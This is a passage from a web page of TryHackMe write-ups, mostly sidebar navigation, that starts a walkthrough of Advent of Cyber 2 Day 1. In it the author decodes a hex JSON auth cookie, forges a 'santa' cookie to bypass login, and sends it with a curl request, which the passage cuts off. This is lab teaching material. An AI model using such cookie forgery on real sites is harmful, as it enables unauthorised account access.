menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Linux Local Enumeration/">Linux: Local Enumeration</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Linux PrivEsc/ Linux PrivEsc/">Linux PrivEsc</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Looking Glass/">Looking Glass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Madness/">Madness</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Magician/">Magician</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Metaspliot/Metasploit/">Metaspliot</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mindgames/">Mindgames</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Misguided Ghosts/Misguided Ghost/">Misguided Ghosts</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mnemonic/">Mnemonic</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Motunui/">Motunui</a><button aria-label="Toggle the collapsible sidebar category &#x27;Motunui&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mr Robot CTF/">Mr Robot CTF</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Musical Stego/ Musical Stego/">Musical Stego</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/NIS - Linux Part I/">NIS - Linux Part I</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nax/">Nax</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/NerdHerd/NerdHeard/">NerdHerd</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nessus/">Nessus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Network Services/">Network Services</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Networking/">Networking</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ninja Skills/">Ninja Skills</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nmap/">Nmap</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OWASP Top 10/">OWASP Top 10</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OWASP ZAP/">Introduction to OWASP ZAP</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OhSINT/">OhSINT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/One Piece/">One Piece</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Overpass/">Overpass</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Overpass 2 - Hacked/Overpass 2/">Overpass 2 - Hacked</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/PS Empire/">PS Empire</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Peak Hill/">Peak Hill</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Persistence/">Persistence</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Pickle Rick/">Pickle Rick</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Post-Exploitation Basics/Post Exploitation Basics/">Post-Exploitation Basics</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Poster/">Poster</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Printer Hacking 101/">Printer Hacking 101</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Psycho Break/Pyscho Break/">Psycho Break</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Python Playground/">Python Playground</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ra/">Ra</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ra 2/">Ra 2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Racetrack Bank/">Racetrack Bank</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Recovery/">Recovery</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Relevant/Relevent/">Relevant</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Res/">Res</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Retro/">Retro</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Revenge/">Revenge</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Reverse Engineering/">Reverse Engineering</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Reversing ELF/">Reversing ELF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/RootMe/">RootMe</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/SSRF/">SSRF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Scripting/">Scripting</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Set/">Set</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Shodan.io/Shodan/">Shodan.io</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Simple CTF/">Simple CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Skynet/">Skynet</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Smag Grotto/">Smag Grotto</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Source/">Source</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Splunk/">Splunk</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Spring/">Spring</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Starting Out In Cyber Sec/">Starting Out In Cyber Sec</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Startup/">Startup</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Steel Mountain/">Steel Mountain</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/StuxCTF/">StuxCTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sublist3r/">Sublist3r</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sudo Buffer Overflow/">Sudo Buffer Overflow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sudo Security Bypass/">Sudo Security Bypass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Symfonos6/">symfonos6</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tartarus/">Tartarus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tempus Fugit Durius/">Tempus Fugit Durius</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Blob Blog/">The Blob Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Docker Rodeo/">The Docker Rodeo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Impossible Challenge/">The Impossible Challenge</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Marketplace/">The Marketplace</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Server From Hell/">The Server From Hell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The find command/">The find command</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Thompson/">Thompson</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tmux/">tmux</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tomghost/">tomghost</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tony the Tiger/">Tony the Tiger</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/ToolsRus/">ToolsRus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tor/">Tor</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tutorial/">Tutorial</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Undiscovered/">Undiscovered</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Upload Vulnerabilities/">Upload Vulnerabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/WWBuddy/">WWBuddy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Web Fundamentals/">Web Fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Web Scanning/">Web Scanning</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/WebAppSec 101/">WebAppSec 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wgel CTF/">Wgel CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Willow/">Willow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Windows PrivEsc Arena/">Windows PrivEsc Arena</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wireshark 101/">Wireshark 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wonderland/">Wonderland</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/XXE/">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Dog/">Year of the Dog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Fox/">Year of the Fox</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Pig/">Year of the Pig</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Rabbit/">Year of the Rabbit</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Zero Logon/">Zero Logon</a></li></ul></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Tryhackme</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Advent of Cyber 2</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Advent of Cyber 2</h1></header><p>#Advent of Cyber 2</p><p>Event Homepage: <a href="https://tryhackme.com/christmas" target="_blank" rel="noopener noreferrer"><code>https://tryhackme.com/christmas</code></a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="checklist">Checklist<a href="#checklist" class="hash-link" aria-label="Direct link to Checklist" title="Direct link to Checklist">​</a></h2><ul class="contains-task-list containsTaskList_mC6p"><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-1-a-christmas-crisis">Day 1 - A Christmas Crisis</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-2-the-elf-strikes-back">Day 2 - The Elf Strikes Back</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-3-christmas-chaos">Day 3 - Christmas Chaos</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-4-santas-watching">Day 4 - Santa&#x27;s watching</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-5-someone-stole-santas-gift-list">Day 5 - Someone stole Santa&#x27;s gift list!</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-6-be-careful-with-what-you-wish-on-a-christmas-night">Day 6 - Be careful with what you wish on a Christmas night</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-7-the-grinch-really-did-steal-christmas">Day 7 - The Grinch Really Did Steal Christmas</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-8-whats-under-the-christmas-tree">Day 8 - What&#x27;s Under the Christmas Tree?</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-9-anyone-can-be-santa">Day 9 - Anyone can be Santa!</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-10-dont-be-elfish">Day 10 - Don&#x27;t be Elfish!</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-11-the-rogue-gnome">Day 11 - The Rogue Gnome</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-12-ready-set-elf">Day 12 - Ready, set, elf.</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-13-coal-for-christmas">Day 13 - Coal for Christmas</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-14-wheres-rudolph">Day 14 - Where&#x27;s Rudolph?</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-15-theres-a-python-in-my-stocking">Day 15 - There&#x27;s a Python in my stocking!</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-16-help-where-is-santa">Day 16 - Help! Where is Santa?</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-17-reverse-elfneering">Day 17 - ReverseELFneering</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-18-the-bits-of-the-christmas">Day 18 - The Bits of the Christmas</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-19-the-naughty-or-nice-list">Day 19 - The Naughty or Nice List</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-20-powershellf-to-the-rescue">Day 20 - PowershELlF to the rescue</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#day-21-time-for-some-elforensics">Day 21 - Time for some ELForensics</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#Day-22-Elf-McEager-becomes-CyberElf">Day 22 - Elf McEager becomes CyberElf</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#Day-23-The-Grinch-strikes-again">Day 23 - The Grinch strikes again!</a></li><li class="task-list-item"><input type="checkbox" checked="" disabled=""> <a href="#Day-24-The-Trial-Before-Christmas">Day 24 - The Trial Before Christmas</a></li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-1-a-christmas-crisis">Day 1: A Christmas Crisis<a href="#day-1-a-christmas-crisis" class="hash-link" aria-label="Direct link to Day 1: A Christmas Crisis" title="Direct link to Day 1: A Christmas Crisis">​</a></h2><p><em>Category: Web Exploitation</em><br>
<em>Tags: HTTP, Cookies</em>  </p><blockquote><p>Understand how the web works and take back control of the Christmas Command Centre!</p></blockquote><p>IP: <code>10.10.161.100</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-enumeration">Basic enumeration<a href="#basic-enumeration" class="hash-link" aria-label="Direct link to Basic enumeration" title="Direct link to Basic enumeration">​</a></h3><p>Firstly, I checked out the web server running on port 80 (HTTP).</p><p><img loading="lazy" alt="screenshot" src="/assets/images/ChristmasControlCenterLogin-3e49e16d80d487b5ac786a1717da9e76.png" width="1845" height="844" class="img_ev3q"></p><p>I register for an account using the credentials <code>admin:bluemoon</code> and then log in with those credentials.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/ChirstmasControlCenterControlPanel-3b8aec30f0deec9e9e85ba4ef442f29e.png" width="1846" height="844" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-name-of-the-the-cookie-used-for-authentication">What is the name of the the cookie used for authentication?<a href="#what-is-the-name-of-the-the-cookie-used-for-authentication" class="hash-link" aria-label="Direct link to What is the name of the the cookie used for authentication?" title="Direct link to What is the name of the the cookie used for authentication?">​</a></h3><p>The name of the authentication cookie is: <code>auth</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-format-is-the-value-of-this-cookie-encoded-and-what-format-is-the-data-stored-in">What format is the value of this cookie encoded and what format is the data stored in?<a href="#what-format-is-the-value-of-this-cookie-encoded-and-what-format-is-the-data-stored-in" class="hash-link" aria-label="Direct link to What format is the value of this cookie encoded and what format is the data stored in?" title="Direct link to What format is the value of this cookie encoded and what format is the data stored in?">​</a></h3><p>The value of the auth cookie is: <code>7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2261646d696e227d</code>.  </p><p>Putting the entire thing into <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreferrer">CyberChef</a>, we find that it is using <code>hexadecimal</code> to encode the string: <code>{&quot;company&quot;:&quot;The Best Festival Company&quot;, &quot;username&quot;:&quot;admin&quot;}</code>.  </p><p>The data is stored in <code>JSON</code> format.  </p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="bypassing-the-authentication">Bypassing the authentication<a href="#bypassing-the-authentication" class="hash-link" aria-label="Direct link to Bypassing the authentication" title="Direct link to Bypassing the authentication">​</a></h3><p>We can encode <code>{&quot;company&quot;:&quot;The Best Festival Company&quot;, &quot;username&quot;:&quot;santa&quot;}</code> into hexadecimal to find the value of santa&#x27;s authentication token.  </p><p>Value of the santa cookie: <code>7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d</code>.  </p><p>After setting the auth cookie to that string, we get access to the santa account and full control panel access.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-flag">Getting the flag<a href="#getting-the-flag" class="hash-link" aria-label="Direct link to Getting the flag" title="Direct link to Getting the flag">​</a></h3><p>I&#x27;m not sure why but I got a bit stuck here. Turns out, you just flick all the switches and you get the final flag.</p><p>Flag: <code>THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="making-a-solve-script">Making a <a target="_blank" href="/assets/files/solve-8139da40a9c92b73f6b969059e907088.sh/">solve script</a><a href="#making-a-solve-script" class="hash-link" aria-label="Direct link to making-a-solve-script" title="Direct link to making-a-solve-script">​</a></h3><p>I noticed that the program sends a post request to <code>http://10.10.161.100/api/checkflag</code>. I noticed it also sent the cookie along with it. Therefore, I decided to send a POST request to the URL with the cookie and lo and behold, the flag! Here, I did it using curl in bash:  </p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token function" style="color:rgb(80, 250, 123)">curl</span><span class="token plain"> -X POST -H </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Cookie: auth=7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d&quot;</span><span class="token plain"> http://10.10.161.100/api/checkflag</span><span class="token punctuation" style="color:rgb(248, 248, 